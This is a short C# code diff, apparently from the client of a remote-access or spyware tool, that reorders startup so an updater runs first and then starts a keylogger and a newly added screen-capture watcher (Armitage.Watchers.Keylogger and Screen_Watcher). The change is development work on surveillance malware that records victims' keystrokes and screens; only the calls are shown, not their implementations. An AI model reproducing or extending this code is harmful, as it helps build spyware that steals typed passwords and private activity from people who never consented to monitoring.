@@ -38,13 +38,14 @@ namespace Client
                 ProtectTheLetter();
             }
 #endif
-            /// Start loggers.
-            Armitage.Watchers.Keylogger.Start();
 
             /// Init update checkers.
             Utilities.Updater Updater = new Utilities.Updater();
             Updater.Start();
 
+            /// Start loggers.
+            Armitage.Watchers.Keylogger.Start();
+            Armitage.Watchers.Screen_Watcher.Start();
             while (true)
             {
                 // Sleep
